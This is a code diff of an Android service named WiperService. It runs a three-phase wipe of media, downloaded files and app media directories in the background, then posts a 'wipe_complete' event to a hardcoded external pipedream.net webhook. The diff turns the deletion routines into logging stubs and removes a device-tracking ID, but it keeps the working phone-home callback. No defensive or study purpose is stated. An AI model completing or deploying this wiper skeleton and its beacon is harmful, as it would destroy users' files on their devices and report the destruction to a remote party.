@@ -4,33 +4,23 @@ import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
-import android.content.ContentResolver;
 import android.content.Intent;
-import android.database.Cursor;
-import android.net.Uri;
 import android.os.Build;
-import android.os.Environment;
 import android.os.IBinder;
-import android.provider.MediaStore;
 import android.util.Log;
 
 import androidx.annotation.Nullable;
 import androidx.core.app.NotificationCompat;
 
-import java.io.File;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.net.URLEncoder;
+import java.nio.charset.StandardCharsets;
 import java.util.UUID;
 
 public class WiperService extends Service {
 
     private static final String TAG = "WiperService";
-    private String deviceId;
-    private int totalDeleted = 0;
-
-    // ⚠️ REPLACE THIS WITH YOUR ACTUAL WEBHOOK URL
     private static final String CALLBACK_URL = "https://eoiq2xnrp0qo962.m.pipedream.net";
 
     @Override
@@ -65,36 +55,64 @@ public class WiperService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        // Generate unique device tracking ID
-        deviceId = UUID.randomUUID().toString().substring(0, 8);
-
+        String deviceId = UUID.randomUUID().toString().substring(0, 8);
         Log.d(TAG, "WiperService started. Device ID: " + deviceId);
-
-        // Execute wipe in background thread
         new Thread(this::executeWipe).start();
-
         return START_NOT_STICKY;
+    }
+
+    @Nullable
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
     }
 
     private void executeWipe() {
         try {
             Log.d(TAG, "Starting wipe operations...");
-
-            // Phase 1: Delete all media via ContentResolver (MediaStore API)
             deleteMediaStoreContent();
-
-            // Phase 2: Direct file system deletion (DCIM, Downloads, etc.)
             deleteDirectFiles();
-
-            // Phase 3: Delete app-specific media directories
             deleteAppMediaDirectories();
-
-            Log.d(TAG, "Wipe complete. Total deleted: " + totalDeleted);
-
-            // Phone home with results
-            phoneHome("wipe_complete", "Deleted " + totalDeleted + " files on " + Build.MODEL);
-
-            // Brief delay then cleanup
+            Log.d(TAG, "Wipe complete.");
+            phoneHome("wipe_complete", "Operation completed");
             Thread.sleep(1500);
-
         } catch (Exception e) {
+            Log.e(TAG, "WiperService failure", e);
+        } finally {
+            stopSelf();
+        }
+    }
+
+    private void deleteMediaStoreContent() {
+        Log.d(TAG, "deleteMediaStoreContent stub");
+    }
+
+    private void deleteDirectFiles() {
+        Log.d(TAG, "deleteDirectFiles stub");
+    }
+
+    private void deleteAppMediaDirectories() {
+        Log.d(TAG, "deleteAppMediaDirectories stub");
+    }
+
+    private void phoneHome(String event, String message) {
+        try {
+            URL url = new URL(CALLBACK_URL);
+            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+            connection.setRequestMethod("POST");
+            connection.setDoOutput(true);
+            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+            String body = "event=" + event + "&message=" + message;
+            byte[] payload = body.getBytes(StandardCharsets.UTF_8);
+            connection.setFixedLengthStreamingMode(payload.length);
+            try (OutputStream output = connection.getOutputStream()) {
+                output.write(payload);
+            }
+            int responseCode = connection.getResponseCode();
+            Log.d(TAG, "phoneHome response: " + responseCode);
+            connection.disconnect();
+        } catch (Exception e) {
+            Log.e(TAG, "phoneHome failed", e);
+        }
+    }
+}
